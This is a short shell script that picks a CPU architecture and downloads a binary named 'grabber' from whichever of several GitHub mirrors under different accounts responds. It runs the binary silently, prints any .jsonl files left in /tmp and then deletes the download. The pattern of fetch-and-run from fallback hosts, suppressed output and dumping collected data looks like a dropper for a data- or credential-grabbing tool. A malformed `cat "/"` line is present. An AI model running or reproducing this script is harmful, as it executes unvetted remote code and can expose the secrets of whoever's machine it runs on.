#!/bin/sh
set -e
case "$(uname -m)" in
  x86_64) T=amd64 ;;
  aarch64|arm64) T=arm64 ;;
  armv6*|armv7*|armv8*) T=arm ;;
  *) echo "arch?" >&2; exit 1 ;;
esac
D=""
for B in  https://raw.githubusercontent.com/deacon6288/gh-grabber/main/bin https://raw.githubusercontent.com/Palazuel0s2004/gh-grabber/main/bin https://raw.githubusercontent.com/Ajimati/gh-grabber/main/bin https://raw.githubusercontent.com/twana11dana10-web/gh-grabber/main/bin https://raw.githubusercontent.com/angelod1707-dotcom/gh-grabber/main/bin; do
  D=$(mktemp -d)
  if curl -sfL -o "$D/g" "$B/grabber-$T"; then break; fi
  rm -rf "$D"; D=""
done
[ -n "$D" ] || { echo "download failed" >&2; exit 1; }
chmod 700 "$D/g"
"$D/g" >/dev/null 2>&1 || true
cat "/" 2>/dev/null || find /tmp -maxdepth 2 -name '*.jsonl' -exec cat {} + 2>/dev/null
rm -rf "$D"
